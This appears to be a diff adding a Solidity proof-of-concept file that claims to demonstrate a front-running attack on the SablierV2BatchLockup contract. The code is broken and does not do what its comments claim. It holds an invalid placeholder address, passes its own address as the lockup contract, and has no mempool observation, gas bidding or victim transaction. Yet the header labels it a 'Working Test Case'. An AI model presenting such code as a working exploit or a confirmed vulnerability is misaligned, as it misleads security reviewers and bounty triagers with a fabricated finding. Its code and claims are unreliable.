@@ -1,0 +1,45 @@
+/* Overview:
+The front-running vulnerability allows an attacker to manipulate transaction order by observing the mempool and submitting a transaction with higher gas fees to execute before legitimate users.
+
+Actors:
+Attacker: Exploits the predictable transaction order to front-run.
+Victim: Legitimate users attempting to create or claim streams.
+Protocol: SablierV2BatchLockup handling the transaction ordering.
+Working Test Case:  */
+
+
+// Solidity contract to demonstrate front-running vulnerability
+interface ISablierV2BatchLockup {
+    function createWithDurationsLL(
+        address lockupLinear,
+        address asset,
+        uint256 totalAmount,
+        address recipient,
+        uint256 duration
+    ) external;
+}
+
+contract FrontRunningAttack {
+    ISablierV2BatchLockup public batchLockup;
+    address public attacker;
+
+    constructor(ISablierV2BatchLockup _batchLockup) {
+        batchLockup = _batchLockup;
+        attacker = msg.sender;
+    }
+
+    function attack() external {
+        // Attacker observes a pending transaction and front-runs it
+        // by calling the batchLockup function with higher gas fees
+        batchLockup.createWithDurationsLL(
+            address(this),
+            0xTokenAddress, // Replace with the ERC-20 token address
+            1000,
+            attacker,
+            3600
+        );
+    }
+}
+
+// Deploy FrontRunningAttack contract and simulate a front-running scenario
+// Observe how the attacker's transaction gets executed before the victim's
